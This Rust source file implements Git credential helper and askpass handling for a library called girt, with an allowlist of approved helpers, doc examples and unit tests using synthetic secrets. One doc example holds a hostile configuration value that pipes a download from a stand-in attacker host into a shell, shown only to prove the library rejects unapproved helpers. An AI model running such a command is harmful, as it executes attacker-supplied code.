//! Explicit credential helper and askpass lifecycle.

use std::io::{Read, Write};
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc;
use std::time::{Duration, Instant};

use super::CredentialStore;
use crate::Config;
use crate::config::boolean;

/// What a credential is for: the protocol, host and optionally repository path of a remote.
///
/// Helpers store and look up credentials by these fields, so the same context must be used to
/// fill a credential and to report whether the server accepted it. Build it from the URL the
/// transfer connects to, without any username or password. Components must not contain CR, LF,
/// or NUL. A path is sent only when `use_http_path` is true; the `credential.useHttpPath` setting
/// can turn it on during [`CredentialSession::fill`].
///
/// # Examples
///
/// ```
/// use girt::remote::CredentialContext;
///
/// // For https://example.com:8443/team/project.git
/// let context = CredentialContext::new(b"https".to_vec(), b"example.com:8443".to_vec())
///     .with_path(Some(b"team/project.git".to_vec()));
/// assert!(
///     !context.use_http_path,
///     "the path is kept but not sent unless enabled"
/// );
/// ```
#[derive(Clone)]
#[non_exhaustive]
pub struct CredentialContext {
    /// URL scheme, such as `https`.
    pub protocol: Vec<u8>,
    /// Host and optional port.
    pub host: Vec<u8>,
    /// Repository path without a leading slash.
    pub path: Option<Vec<u8>>,
    /// Whether helpers may distinguish repositories on the same HTTP host.
    pub use_http_path: bool,
}

impl CredentialContext {
    /// Creates a context without a path; HTTP path matching is disabled.
    pub fn new(protocol: Vec<u8>, host: Vec<u8>) -> Self {
        Self {
            protocol,
            host,
            path: None,
            use_http_path: false,
        }
    }

    /// Sets [`Self::protocol`].
    #[must_use]
    pub fn with_protocol(mut self, protocol: Vec<u8>) -> Self {
        self.protocol = protocol;
        self
    }

    /// Sets [`Self::host`].
    #[must_use]
    pub fn with_host(mut self, host: Vec<u8>) -> Self {
        self.host = host;
        self
    }

    /// Sets [`Self::path`].
    #[must_use]
    pub fn with_path(mut self, path: Option<Vec<u8>>) -> Self {
        self.path = path;
        self
    }

    /// Sets [`Self::use_http_path`].
    #[must_use]
    pub fn with_use_http_path(mut self, use_http_path: bool) -> Self {
        self.use_http_path = use_http_path;
        self
    }
}

impl std::fmt::Debug for CredentialContext {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CredentialContext").finish_non_exhaustive()
    }
}

/// A username and password returned by a helper or a prompt.
///
/// For token authentication the token is usually the password. Debug output deliberately omits
/// both values.
///
/// # Examples
///
/// ```
/// use girt::remote::Credential;
///
/// let credential = Credential::new().with_username(Some(b"alice".to_vec()));
/// assert!(!credential.complete(), "a password is still needed");
/// assert!(!format!("{credential:?}").contains("alice"));
/// ```
#[derive(Clone, Default)]
#[non_exhaustive]
pub struct Credential {
    /// Username returned by a helper or prompt.
    pub username: Option<Vec<u8>>,
    /// Password or token returned by a helper or prompt.
    pub password: Option<Vec<u8>>,
}

impl Credential {
    /// Creates an empty credential with no username or password.
    pub fn new() -> Self {
        Self {
            username: None,
            password: None,
        }
    }

    /// Sets [`Self::username`].
    #[must_use]
    pub fn with_username(mut self, username: Option<Vec<u8>>) -> Self {
        self.username = username;
        self
    }

    /// Sets [`Self::password`].
    #[must_use]
    pub fn with_password(mut self, password: Option<Vec<u8>>) -> Self {
        self.password = password;
        self
    }
}

impl std::fmt::Debug for Credential {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Credential").finish_non_exhaustive()
    }
}

impl Credential {
    /// Both fields are needed for ordinary username/password authentication.
    pub fn complete(&self) -> bool {
        self.username.is_some() && self.password.is_some()
    }
}

/// An application-approved executable and arguments. No shell interpretation is performed.
///
/// A program used as a credential helper receives the action (`get`, `store` or `erase`) as its
/// last argument and speaks Git's credential protocol on standard input and output. Programs
/// start with an empty environment unless `inherit_environment` is set; pass what they need,
/// such as `HOME`, in `environment`.
///
/// # Examples
///
/// Approve the configured helper `osxkeychain` by mapping it to Git's program for it:
///
/// ```
/// use std::path::PathBuf;
///
/// use girt::remote::{CredentialBackend, CredentialHelper, CredentialProgram};
///
/// let program = CredentialProgram::new(PathBuf::from(
///     "/opt/homebrew/opt/git/libexec/git-core/git-credential-osxkeychain",
/// ))
/// .with_environment(vec![("HOME".into(), "/Users/alice".into())]);
/// let helper =
///     CredentialHelper::new(b"osxkeychain".to_vec(), CredentialBackend::Program(program));
/// # let _ = helper;
/// ```
#[derive(Clone)]
#[non_exhaustive]
pub struct CredentialProgram {
    /// Executable path or name resolved through the caller's approved PATH.
    pub executable: PathBuf,
    /// Literal arguments, before the helper action or askpass prompt.
    pub arguments: Vec<std::ffi::OsString>,
    /// Whether to inherit the caller process environment. Prefer false for narrow trust.
    pub inherit_environment: bool,
    /// Environment entries supplied by the application after optional clearing.
    pub environment: Vec<(std::ffi::OsString, std::ffi::OsString)>,
}

impl CredentialProgram {
    /// Creates a program with no arguments or environment entries and no environment inheritance.
    pub fn new(executable: PathBuf) -> Self {
        Self {
            executable,
            arguments: Vec::new(),
            inherit_environment: false,
            environment: Vec::new(),
        }
    }

    /// Sets [`Self::executable`].
    #[must_use]
    pub fn with_executable(mut self, executable: PathBuf) -> Self {
        self.executable = executable;
        self
    }

    /// Sets [`Self::arguments`].
    #[must_use]
    pub fn with_arguments(mut self, arguments: Vec<std::ffi::OsString>) -> Self {
        self.arguments = arguments;
        self
    }

    /// Sets [`Self::inherit_environment`].
    #[must_use]
    pub fn with_inherit_environment(mut self, inherit_environment: bool) -> Self {
        self.inherit_environment = inherit_environment;
        self
    }

    /// Sets [`Self::environment`].
    #[must_use]
    pub fn with_environment(
        mut self,
        environment: Vec<(std::ffi::OsString, std::ffi::OsString)>,
    ) -> Self {
        self.environment = environment;
        self
    }
}

impl std::fmt::Debug for CredentialProgram {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CredentialProgram").finish_non_exhaustive()
    }
}

/// A configured helper that the application explicitly mapped to a trusted implementation.
///
/// `configured_name` is the exact `credential.helper` value, such as `osxkeychain` or
/// `store --file ~/.creds`. [`CredentialSession::fill`] runs only helpers whose configured value
/// matches one of these, so a repository's configuration cannot make the application run an
/// arbitrary program. See [`CredentialProgram`] for an example.
#[derive(Clone)]
#[non_exhaustive]
pub struct CredentialHelper {
    /// Exact configuration value; used only to match the selected helper order.
    pub configured_name: Vec<u8>,
    /// What answers the helper's `get`, `store` and `erase` requests.
    pub backend: CredentialBackend,
}

impl CredentialHelper {
    /// Creates a helper from its configured name and explicitly approved backend.
    pub fn new(configured_name: Vec<u8>, backend: CredentialBackend) -> Self {
        Self {
            configured_name,
            backend,
        }
    }

    /// Sets [`Self::configured_name`].
    #[must_use]
    pub fn with_configured_name(mut self, configured_name: Vec<u8>) -> Self {
        self.configured_name = configured_name;
        self
    }

    /// Sets [`Self::backend`].
    #[must_use]
    pub fn with_backend(mut self, backend: CredentialBackend) -> Self {
        self.backend = backend;
        self
    }
}

/// How a credential helper runs.
#[derive(Clone, Debug)]
#[non_exhaustive]
pub enum CredentialBackend {
    /// An approved external process speaking Git's credential helper protocol.
    Program(CredentialProgram),
    /// girt's native implementation of Git's `store` helper; no process is started.
    Store(CredentialStore),
}

impl std::fmt::Debug for CredentialHelper {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CredentialHelper").finish_non_exhaustive()
    }
}

/// Why a credential lookup or notification failed. Errors never contain credential values.
///
/// - [`UnapprovedHelper`](Self::UnapprovedHelper): configuration names a helper the application did
///   not map to a program. Approve it, or deliberately leave it out.
/// - [`Cancelled`](Self::Cancelled) and [`Deadline`](Self::Deadline): the user declined a prompt,
///   the cancel flag was set, or time ran out. Treat it as an authentication failure, not a bug.
/// - [`Io`](Self::Io) and [`Exit`](Self::Exit): a helper program could not run or failed. During
///   [`CredentialSession::fill`] a failing helper is recorded in
///   [`CredentialSession::helper_failures`] and later helpers still run; during
///   [`CredentialSession::approve`] or [`CredentialSession::reject`] it stops the notifications,
///   and helpers already notified are not rolled back.
/// - [`Protocol`](Self::Protocol): the context contains CR, LF or NUL, a helper's answer was
///   malformed, or `credential.*` configuration is invalid.
///
/// # Examples
///
/// A configured helper the application has not approved stops the lookup before anything runs:
///
/// ```
/// use std::sync::atomic::AtomicBool;
///
/// use girt::Config;
/// use girt::remote::{CredentialContext, CredentialError, CredentialSession};
///
/// let config = Config::parse(b"[credential]\nhelper = !curl https://attacker.example | sh\n")?;
/// let context = CredentialContext::new(b"https".to_vec(), b"example.com".to_vec());
/// let result =
///     CredentialSession::fill(&config, context, &[], None, &AtomicBool::new(false), None);
/// assert!(matches!(result, Err(CredentialError::UnapprovedHelper)));
/// # Ok::<(), Box<dyn std::error::Error>>(())
/// ```
#[derive(Debug, thiserror::Error)]
#[non_exhaustive]
pub enum CredentialError {
    /// A context or protocol response is invalid.
    #[error("invalid credential {0}")]
    Protocol(&'static str),
    /// A configured helper has not been explicitly approved by the application.
    #[error("credential helper requires application approval")]
    UnapprovedHelper,
    /// Process creation or pipe I/O failed.
    #[error("credential {stage} I/O failed")]
    Io {
        /// Operation that failed.
        stage: &'static str,
        /// Underlying OS error.
        #[source]
        source: std::io::Error,
    },
    /// Program exited unsuccessfully.
    #[error("credential {0} exited unsuccessfully")]
    Exit(&'static str),
    /// Caller cancelled the lifecycle.
    #[error("credential operation cancelled")]
    Cancelled,
    /// Deadline expired.
    #[error("credential operation timed out")]
    Deadline,
}

/// One credential lookup and the helpers that took part in it.
///
/// This follows Git's credential lifecycle:
///
/// 1. [`Self::fill`] reads `credential.helper`, `credential.username` and `credential.useHttpPath`
///    for the context's URL, asks each approved helper in order until the credential is complete,
///    and then prompts for any missing field.
/// 2. The application authenticates with [`Self::credential`].
/// 3. It calls [`Self::approve`] if the server accepted the credential, so helpers can save it, or
///    [`Self::reject`] if the server refused it, so they can forget it.
///
/// The application owns the allowlist of helpers, the prompt and any saved secret.
/// [`crate::workflow`] runs this lifecycle for configured HTTP remotes. All methods are
/// blocking; call them on an application worker when used from an async runtime.
///
/// # Examples
///
/// Answer from Git's `store` file, as `credential.helper = store --file <path>` does, without
/// running Git:
///
/// ```
/// use std::sync::atomic::AtomicBool;
///
/// use girt::Config;
/// use girt::remote::{
///     CredentialBackend, CredentialContext, CredentialHelper, CredentialSession, CredentialStore,
/// };
///
/// let directory = tempfile::tempdir()?;
/// let file = directory.path().join("credentials");
/// std::fs::write(&file, "https://alice:s3cret@example.com\n")?;
///
/// let config = Config::parse(b"[credential]\nhelper = store\n")?;
/// let store = CredentialHelper::new(
///     b"store".to_vec(),
///     CredentialBackend::Store(CredentialStore::file(&file)),
/// );
/// let context = CredentialContext::new(b"https".to_vec(), b"example.com".to_vec());
/// let cancel = AtomicBool::new(false);
/// let session = CredentialSession::fill(&config, context, &[store], None, &cancel, None)?;
/// assert_eq!(
///     session.credential().username.as_deref(),
///     Some(&b"alice"[..])
/// );
/// assert_eq!(
///     session.credential().password.as_deref(),
///     Some(&b"s3cret"[..])
/// );
///
/// // The server refused it: forget it, so the next lookup prompts instead.
/// session.reject(&cancel, None)?;
/// assert_eq!(std::fs::read_to_string(&file)?, "");
/// # Ok::<(), Box<dyn std::error::Error>>(())
/// ```
///
/// Prompt when no helper answers:
///
/// ```
/// use std::sync::atomic::AtomicBool;
///
/// use girt::Config;
/// use girt::remote::{CredentialContext, CredentialSession, Prompt};
///
/// let config = Config::parse(b"")?;
/// let context = CredentialContext::new(b"https".to_vec(), b"example.invalid".to_vec())
///     .with_path(Some(b"repo".to_vec()))
///     .with_use_http_path(false);
/// let cancel = AtomicBool::new(false);
/// let mut prompt = |field| {
///     Some(match field {
///         Prompt::Username => b"sample-user".to_vec(),
///         Prompt::Password => b"synthetic-secret".to_vec(),
///         _ => return None,
///     })
/// };
/// let session = CredentialSession::fill(&config, context, &[], Some(&mut prompt), &cancel, None)?;
/// assert!(session.credential().complete());
/// # Ok::<(), Box<dyn std::error::Error>>(())
/// ```
pub struct CredentialSession {
    context: CredentialContext,
    helpers: Vec<CredentialBackend>,
    credential: Credential,
    helper_failures: Vec<(usize, CredentialError)>,
}

impl std::fmt::Debug for CredentialSession {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CredentialSession").finish_non_exhaustive()
    }
}

impl CredentialSession {
    /// Query configured helpers in order, then prompt for any missing field if allowed.
    ///
    /// An empty `credential.helper` resets earlier helpers. The application supplies `programs`
    /// for every remaining helper; shell snippets and helpers that internally invoke Git require
    /// explicit application handling. Prompt is called with `Username` or `Password`, and can
    /// return `None` to cancel. No process is started when `cancel` is already set.
    ///
    /// # Errors
    ///
    /// Returns [`CredentialError`] for malformed context/configuration/helper responses, unapproved
    /// helpers, process or store I/O, cancellation or deadline expiry. A prompt returning `None`
    /// reports cancellation. Nonzero helper exits are retained in [`Self::helper_failures`] while
    /// later helpers are tried; success does not guarantee complete credentials when no prompt is
    /// supplied.
    pub fn fill(
        config: &Config,
        mut context: CredentialContext,
        programs: &[CredentialHelper],
        mut prompt: Option<&mut dyn FnMut(Prompt) -> Option<Vec<u8>>>,
        cancel: &AtomicBool,
        deadline: Option<Instant>,
    ) -> Result<Self, CredentialError> {
        validate_context(&context)?;
        let mut names = Vec::new();
        let mut username = None;
        for entry in config.entries() {
            if !entry.section.eq_ignore_ascii_case(b"credential")
                || !scope_matches(entry.subsection.as_deref(), &context)
            {
                continue;
            }
            if entry.name.eq_ignore_ascii_case(b"username") {
                username = Some(
                    entry
                        .value
                        .clone()
                        .ok_or(CredentialError::Protocol("username configuration"))?,
                );
            } else if entry.name.eq_ignore_ascii_case(b"usehttppath") {
                context.use_http_path = boolean(entry.value.as_deref())
                    .ok_or(CredentialError::Protocol("path configuration"))?;
            } else if entry.name.eq_ignore_ascii_case(b"helper") {
                let name = entry
                    .value
                    .as_deref()
                    .ok_or(CredentialError::Protocol("helper configuration"))?;
                if name.is_empty() {
                    names.clear();
                } else {
                    names.push(name);
                }
            }
        }
        let mut helpers = Vec::new();
        for name in names {
            let selected = programs
                .iter()
                .find(|program| program.configured_name == name)
                .ok_or(CredentialError::UnapprovedHelper)?;
            helpers.push(selected.backend.clone());
        }
        let mut credential = Credential {
            username,
            password: None,
        };
        let mut helper_failures = Vec::new();
        for (position, helper) in helpers.iter().enumerate() {
            let program = match helper {
                CredentialBackend::Program(program) => program,
                CredentialBackend::Store(store) => {
                    check(cancel, deadline)?;
                    store.get(&context, &mut credential)?;
                    if credential.complete() {
                        break;
                    }
                    continue;
                }
            };
            let input = encode(&context, &credential)?;
            let output = match run(program, Some("get"), &input, cancel, deadline) {
                Ok(output) => output,
                Err(error @ CredentialError::Exit(_)) => {
                    helper_failures.push((position, error));
                    continue;
                }
                Err(error) => return Err(error),
            };
            merge(&mut credential, &output)?;
            if credential.complete() {
                break;
            }
        }
        if !credential.complete()
            && let Some(prompt) = prompt.as_mut()
        {
            if credential.username.is_none() {
                check(cancel, deadline)?;
                credential.username =
                    Some(prompt(Prompt::Username).ok_or(CredentialError::Cancelled)?);
            }
            if credential.password.is_none() {
                check(cancel, deadline)?;
                credential.password =
                    Some(prompt(Prompt::Password).ok_or(CredentialError::Cancelled)?);
            }
        }
        check(cancel, deadline)?;
        Ok(Self {
            context,
            helpers,
            credential,
            helper_failures,
        })
    }

    /// Nonzero helper exits and their zero-based configured positions. Later helpers still ran.
    pub fn helper_failures(&self) -> &[(usize, CredentialError)] {
        &self.helper_failures
    }

    /// Secret result for one authentication attempt.
    pub fn credential(&self) -> &Credential {
        &self.credential
    }

    /// Scope used for this lookup. Transports must compare it with the final destination before
    /// attaching the credential to a request.
    pub fn context(&self) -> &CredentialContext {
        &self.context
    }

    /// Notify all selected helpers after successful authentication.
    ///
    /// # Errors
    ///
    /// Returns [`CredentialError`] for invalid protocol bytes, helper/store I/O, unsuccessful
    /// helper exit, cancellation or deadline expiry. Earlier helpers may already have stored
    /// credentials; notifications are sequential and are not rolled back.
    pub fn approve(
        &self,
        cancel: &AtomicBool,
        deadline: Option<Instant>,
    ) -> Result<(), CredentialError> {
        self.notify("store", cancel, deadline)
    }

    /// Notify all selected helpers after rejected authentication.
    ///
    /// # Errors
    ///
    /// Returns [`CredentialError`] for invalid protocol bytes, helper/store I/O, unsuccessful
    /// helper exit, cancellation or deadline expiry. Earlier helpers may already have erased
    /// credentials; notifications are sequential and are not rolled back.
    pub fn reject(
        &self,
        cancel: &AtomicBool,
        deadline: Option<Instant>,
    ) -> Result<(), CredentialError> {
        self.notify("erase", cancel, deadline)
    }

    fn notify(
        &self,
        action: &'static str,
        cancel: &AtomicBool,
        deadline: Option<Instant>,
    ) -> Result<(), CredentialError> {
        let input = encode(&self.context, &self.credential)?;
        for helper in &self.helpers {
            match helper {
                CredentialBackend::Program(program) => {
                    run(program, Some(action), &input, cancel, deadline)?;
                }
                CredentialBackend::Store(store) => {
                    check(cancel, deadline)?;
                    if action == "store" {
                        store.store(&self.context, &self.credential)?;
                    } else {
                        store.erase(&self.context, &self.credential)?;
                    }
                }
            }
        }
        Ok(())
    }
}

/// A field requested by the application-owned prompt callback.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[non_exhaustive]
pub enum Prompt {
    /// The account name for the endpoint.
    Username,
    /// The secret for the endpoint and previously chosen username.
    Password,
}

/// Run an explicitly approved askpass executable for one prompt; `None` means user cancellation.
///
/// An askpass program, such as the one named by `SSH_ASKPASS` or `core.askPass`, receives the
/// question as its last argument and prints the answer. GUI applications use one to ask for a
/// password in a dialog when no terminal is available.
///
/// # Examples
///
/// ```
/// # #[cfg(unix)] {
/// use std::sync::atomic::AtomicBool;
///
/// use girt::remote::{CredentialProgram, askpass};
///
/// // A stand-in for a dialog that answers every question with the same token.
/// let program = CredentialProgram::new("/bin/sh".into()).with_arguments(vec![
///     "-c".into(),
///     "echo token-123".into(),
///     "askpass".into(),
/// ]);
/// let answer = askpass(
///     &program,
///     "Password for 'https://example.com': ",
///     &AtomicBool::new(false),
///     None,
/// )?;
/// assert_eq!(answer, Some(b"token-123".to_vec()));
/// # }
/// # Ok::<(), girt::remote::CredentialError>(())
/// ```
///
/// # Errors
///
/// Returns [`CredentialError::Protocol`] for NUL, CR or LF in the question, or process/protocol,
/// exit, cancellation or deadline errors while running the approved executable. An empty answer
/// is successful user cancellation (`Ok(None)`); the executable may already have run on failure.
pub fn askpass(
    program: &CredentialProgram,
    question: &str,
    cancel: &AtomicBool,
    deadline: Option<Instant>,
) -> Result<Option<Vec<u8>>, CredentialError> {
    if question.contains(['\0', '\r', '\n']) {
        return Err(CredentialError::Protocol("askpass question"));
    }
    let output = run_askpass(program, question, cancel, deadline)?;
    let answer = output.strip_suffix(b"\n").unwrap_or(&output);
    let answer = answer.strip_suffix(b"\r").unwrap_or(answer);
    if answer.is_empty() {
        Ok(None)
    } else {
        Ok(Some(answer.to_vec()))
    }
}

fn validate_context(context: &CredentialContext) -> Result<(), CredentialError> {
    for value in [
        &context.protocol[..],
        &context.host[..],
        context.path.as_deref().unwrap_or_default(),
    ] {
        if value.contains(&0) || value.contains(&b'\n') || value.contains(&b'\r') {
            return Err(CredentialError::Protocol("context"));
        }
    }
    if context.protocol.is_empty() || context.host.is_empty() {
        return Err(CredentialError::Protocol("context"));
    }
    Ok(())
}

fn scope_matches(scope: Option<&[u8]>, context: &CredentialContext) -> bool {
    let Some(scope) = scope else {
        return true;
    };
    let Some((protocol, location)) = scope
        .windows(3)
        .position(|part| part == b"://")
        .map(|at| (&scope[..at], &scope[at + 3..]))
    else {
        return false;
    };
    if !protocol.eq_ignore_ascii_case(&context.protocol) {
        return false;
    }
    let slash = location
        .iter()
        .position(|byte| *byte == b'/')
        .unwrap_or(location.len());
    if !location[..slash].eq_ignore_ascii_case(&context.host) {
        return false;
    }
    if slash == location.len() {
        return true;
    }
    let scoped_path = &location[slash + 1..];
    let Some(path) = &context.path else {
        return false;
    };
    path == scoped_path
        || path
            .strip_prefix(scoped_path)
            .is_some_and(|rest| rest.starts_with(b"/"))
}

fn encode(
    context: &CredentialContext,
    credential: &Credential,
) -> Result<Vec<u8>, CredentialError> {
    let mut result = Vec::new();
    for (key, value) in [
        (b"protocol".as_slice(), Some(context.protocol.as_slice())),
        (b"host".as_slice(), Some(context.host.as_slice())),
        (
            b"path".as_slice(),
            context.path.as_deref().filter(|_| context.use_http_path),
        ),
        (b"username".as_slice(), credential.username.as_deref()),
        (b"password".as_slice(), credential.password.as_deref()),
    ] {
        if let Some(value) = value {
            if value.contains(&0) || value.contains(&b'\n') || value.contains(&b'\r') {
                return Err(CredentialError::Protocol("field"));
            }
            result.extend_from_slice(key);
            result.push(b'=');
            result.extend_from_slice(value);
            result.push(b'\n');
        }
    }
    result.push(b'\n');
    Ok(result)
}

fn merge(credential: &mut Credential, output: &[u8]) -> Result<(), CredentialError> {
    for line in output.split(|byte| *byte == b'\n') {
        let line = line.strip_suffix(b"\r").unwrap_or(line);
        if line.is_empty() {
            break;
        }
        let equal = line
            .iter()
            .position(|byte| *byte == b'=')
            .ok_or(CredentialError::Protocol("helper response"))?;
        let (key, remainder) = line.split_at(equal);
        let value = &remainder[1..];
        if value.contains(&0) {
            return Err(CredentialError::Protocol("helper response"));
        }
        match key {
            b"username" => credential.username = Some(value.to_vec()),
            b"password" => credential.password = Some(value.to_vec()),
            b"quit" if value == b"true" => return Err(CredentialError::Cancelled),
            _ => {}
        }
    }
    Ok(())
}

fn run_askpass(
    program: &CredentialProgram,
    question: &str,
    cancel: &AtomicBool,
    deadline: Option<Instant>,
) -> Result<Vec<u8>, CredentialError> {
    process(program, None, Some(question), &[], cancel, deadline)
}

fn run(
    program: &CredentialProgram,
    action: Option<&'static str>,
    input: &[u8],
    cancel: &AtomicBool,
    deadline: Option<Instant>,
) -> Result<Vec<u8>, CredentialError> {
    process(program, action, None, input, cancel, deadline)
}

fn check(cancel: &AtomicBool, deadline: Option<Instant>) -> Result<(), CredentialError> {
    if cancel.load(Ordering::Relaxed) {
        Err(CredentialError::Cancelled)
    } else if deadline.is_some_and(|end| Instant::now() >= end) {
        Err(CredentialError::Deadline)
    } else {
        Ok(())
    }
}

fn process(
    program: &CredentialProgram,
    action: Option<&'static str>,
    question: Option<&str>,
    input: &[u8],
    cancel: &AtomicBool,
    deadline: Option<Instant>,
) -> Result<Vec<u8>, CredentialError> {
    check(cancel, deadline)?;
    let mut command = Command::new(&program.executable);
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        command.process_group(0);
    }
    if !program.inherit_environment {
        command.env_clear();
    }
    command.envs(program.environment.iter().cloned());
    command
        .args(&program.arguments)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null());
    if let Some(action) = action {
        command.arg(action);
    }
    if let Some(question) = question {
        command.arg(question);
    }
    let mut child = command.spawn().map_err(|source| CredentialError::Io {
        stage: "spawn",
        source,
    })?;
    let mut stdin = child.stdin.take().expect("piped stdin");
    let stdout = child.stdout.take().expect("piped stdout");
    let input = input.to_vec();
    let writer = std::thread::spawn(move || stdin.write_all(&input));
    let (sender, receiver) = mpsc::channel();
    let reader = std::thread::spawn(move || {
        let mut output = Vec::new();
        let result = stdout.take(65_537).read_to_end(&mut output);
        let _ = sender.send(output.len() > 65_536);
        (result, output)
    });
    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break status,
            Err(source) => {
                terminate(&mut child);
                let _ = child.wait();
                let _ = writer.join();
                let _ = reader.join();
                return Err(CredentialError::Io {
                    stage: "wait",
                    source,
                });
            }
            Ok(None) => {}
        }
        if let Err(error) = check(cancel, deadline) {
            terminate(&mut child);
            let _ = child.wait();
            let _ = writer.join();
            let _ = reader.join();
            return Err(error);
        }
        if receiver.try_recv() == Ok(true) {
            // A bounded reader has stopped while the child may still be writing.
            if let Ok(Some(status)) = child.try_wait() {
                break status;
            }
            terminate(&mut child);
            let _ = child.wait();
            let _ = writer.join();
            let _ = reader.join();
            return Err(CredentialError::Protocol("response limit"));
        }
        std::thread::sleep(Duration::from_millis(20));
    };
    #[cfg(unix)]
    terminate(&mut child);
    let written = writer
        .join()
        .map_err(|_| CredentialError::Protocol("stdin worker"))?;
    let (read, output) = reader
        .join()
        .map_err(|_| CredentialError::Protocol("stdout worker"))?;
    if !status.success() {
        return Err(CredentialError::Exit(action.unwrap_or("askpass")));
    }
    // A successful helper may answer without consuming every input field. Its closed stdin then
    // yields BrokenPipe even though the response is valid and the process exited successfully.
    if let Err(source) = written
        && source.kind() != std::io::ErrorKind::BrokenPipe
    {
        return Err(CredentialError::Io {
            stage: "stdin",
            source,
        });
    }
    read.map_err(|source| CredentialError::Io {
        stage: "stdout",
        source,
    })?;
    if output.len() > 65_536 {
        return Err(CredentialError::Protocol("response limit"));
    }
    Ok(output)
}

fn terminate(child: &mut std::process::Child) {
    #[cfg(unix)]
    {
        use rustix::process::{Pid, Signal, kill_process_group};
        if let Some(pid) = Pid::from_raw(child.id() as i32) {
            let _ = kill_process_group(pid, Signal::KILL);
        }
    }
    let _ = child.kill();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(unix)]
    fn helper(script: &str) -> (tempfile::TempDir, CredentialHelper) {
        let directory = tempfile::tempdir().unwrap();
        let path = directory.path().join("helper.sh");
        std::fs::write(&path, script).unwrap();
        let helper = CredentialHelper {
            configured_name: b"synthetic".to_vec(),
            backend: CredentialBackend::Program(CredentialProgram {
                executable: PathBuf::from("sh"),
                arguments: vec![path.into_os_string()],
                inherit_environment: false,
                environment: Vec::new(),
            }),
        };
        (directory, helper)
    }

    #[cfg(unix)]
    fn process(helper: &CredentialHelper) -> &CredentialProgram {
        match &helper.backend {
            CredentialBackend::Program(program) => program,
            CredentialBackend::Store(_) => unreachable!("test helpers are programs"),
        }
    }

    #[cfg(unix)]
    fn context(use_http_path: bool) -> CredentialContext {
        CredentialContext {
            protocol: b"https".to_vec(),
            host: b"example.invalid".to_vec(),
            path: Some(b"one/repo".to_vec()),
            use_http_path,
        }
    }

    #[cfg(unix)]
    #[test]
    fn helper_lookup_scope_and_notifications() {
        let directory = tempfile::tempdir().unwrap();
        let record = directory.path().join("record");
        let script = format!(
            "case \"$1\" in\nget) cat > /dev/null; printf 'username=sample\\npassword=synthetic-secret\\n\\n' ;;\nstore|erase) printf '%s\\n' \"$1\" >> '{}'; cat >> '{}' ;;\nesac\n",
            record.display(),
            record.display()
        );
        let (_helper_dir, helper) = helper(&script);
        let config = Config::parse(b"[credential]\nhelper = synthetic\n").unwrap();
        let cancel = AtomicBool::new(false);
        let session =
            CredentialSession::fill(&config, context(true), &[helper], None, &cancel, None)
                .unwrap();
        assert_eq!(
            session.credential().username.as_deref(),
            Some(b"sample".as_slice())
        );
        assert_eq!(
            session.credential().password.as_deref(),
            Some(b"synthetic-secret".as_slice())
        );
        session.approve(&cancel, None).unwrap();
        session.reject(&cancel, None).unwrap();
        let recorded = std::fs::read(record).unwrap();
        assert!(
            recorded
                .windows(b"path=one/repo".len())
                .any(|part| part == b"path=one/repo")
        );
        assert!(
            recorded
                .windows(b"store".len())
                .any(|part| part == b"store")
        );
        assert!(
            recorded
                .windows(b"erase".len())
                .any(|part| part == b"erase")
        );
        assert!(!format!("{session:?}").contains("synthetic-secret"));
    }

    #[cfg(unix)]
    #[test]
    fn helper_reset_and_prompt() {
        let (_directory, helper) = helper("cat > /dev/null; printf 'username=helper\\n\\n'");
        let config =
            Config::parse(b"[credential]\nhelper = unapproved\nhelper =\nhelper = synthetic\n")
                .unwrap();
        let cancel = AtomicBool::new(false);
        let mut prompt = |field| {
            assert_eq!(field, Prompt::Password);
            Some(b"prompted-secret".to_vec())
        };
        let session = CredentialSession::fill(
            &config,
            context(false),
            &[helper],
            Some(&mut prompt),
            &cancel,
            None,
        )
        .unwrap();
        assert_eq!(
            session.credential().password.as_deref(),
            Some(b"prompted-secret".as_slice())
        );
    }

    #[cfg(unix)]
    #[test]
    fn cancellation_kills_waiting_helper() {
        let (_directory, helper) = helper("cat > /dev/null; sleep 30");
        let config = Config::parse(b"[credential]\nhelper = synthetic\n").unwrap();
        let cancel = AtomicBool::new(false);
        let started = Instant::now();
        let result = CredentialSession::fill(
            &config,
            context(false),
            &[helper],
            None,
            &cancel,
            Some(started + Duration::from_millis(100)),
        );
        assert!(matches!(result, Err(CredentialError::Deadline)));
        assert!(started.elapsed() < Duration::from_secs(3));
    }

    #[cfg(unix)]
    #[test]
    fn askpass_returns_answer_and_empty_cancels() {
        let (_directory, program) = helper("printf 'synthetic-secret\\n'");
        let cancel = AtomicBool::new(false);
        assert_eq!(
            askpass(process(&program), "Password:", &cancel, None).unwrap(),
            Some(b"synthetic-secret".to_vec())
        );
        let (_directory, empty) = helper("printf '\\n'");
        assert_eq!(
            askpass(process(&empty), "Password:", &cancel, None).unwrap(),
            None
        );
    }

    #[cfg(windows)]
    #[test]
    fn native_windows_askpass_process() {
        let directory = tempfile::tempdir().unwrap();
        let path = directory.path().join("askpass.cmd");
        std::fs::write(&path, b"@echo off\r\necho synthetic-secret\r\n").unwrap();
        let program = CredentialProgram {
            executable: PathBuf::from("cmd.exe"),
            arguments: vec!["/D".into(), "/C".into(), path.into_os_string()],
            inherit_environment: false,
            environment: Vec::new(),
        };
        let cancel = AtomicBool::new(false);
        assert_eq!(
            askpass(&program, "Password:", &cancel, None).unwrap(),
            Some(b"synthetic-secret".to_vec())
        );
    }
    #[cfg(unix)]
    #[test]
    fn scoped_helper_does_not_run_for_another_repository() {
        let config =
            Config::parse(b"[credential \"https://example.invalid/one\"]\nhelper = synthetic\n")
                .unwrap();
        let cancel = AtomicBool::new(false);
        let other = CredentialContext {
            path: Some(b"other/repo".to_vec()),
            ..context(true)
        };
        let session = CredentialSession::fill(&config, other, &[], None, &cancel, None).unwrap();
